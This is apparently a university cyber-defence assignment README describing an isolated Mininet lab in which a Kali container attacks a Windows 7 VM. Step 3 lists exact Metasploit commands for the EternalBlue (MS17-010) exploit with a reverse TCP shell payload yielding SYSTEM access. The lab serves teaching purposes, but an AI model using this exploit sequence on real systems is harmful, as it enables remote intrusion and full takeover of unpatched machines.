# CDCI Assignment 1 - Team 10 (WannaCry)

## Infrastructure

### Prerequisites
- Ubuntu 24.04 LTS (or higher) VM (Minimum 3GB RAM, 25GB free disk space).
- Root/sudo privileges.
- Internet access for the initial installation step.

### Topology

    mn.attacker (Docker, Kali + MSF)      Windows 7 VM (QEMU)
    10.0.0.2/24                           10.0.0.3/24
          |                                     |
     attacker-eth0                        tap-win7
          |                                     |
          +----------- s1 (OVS) ---------------+
                       (standalone, no uplink)

### Step 1: Install Dependencies and Images (Run Once)
This script installs system packages, creates the Python virtual environment, builds the Kali attacker Docker image, and downloads/prepares the Windows 7 VM image.

    sudo bash infrastructure/install.sh

### Step 2: Start the Lab
This script builds the Mininet topology, launches the attacker container, boots the Windows VM under QEMU, and waits for port 445 to open.

    sudo bash infrastructure/run.sh --hold

Wait until the terminal prints: `Demo ready.`

### Step 3: Execute the Attack
Open a second terminal and launch Metasploit inside the attacker container:

    sudo docker exec -it mn.attacker msfconsole -q

Run these exact commands inside Metasploit:

    use exploit/windows/smb/ms17_010_eternalblue
    set RHOSTS 10.0.0.3
    set PAYLOAD windows/x64/shell/reverse_tcp
    set LHOST 10.0.0.2
    set LPORT 4444
    set GroomAllocations 12
    exploit

You will receive a `NT AUTHORITY\SYSTEM` command shell.

### Step 4: Teardown
Go back to the first terminal (running `run.sh --hold`) and press `Enter`. 

If the script crashed or you need to force a cleanup of the network interfaces and Docker containers:

    sudo bash infrastructure/teardown.sh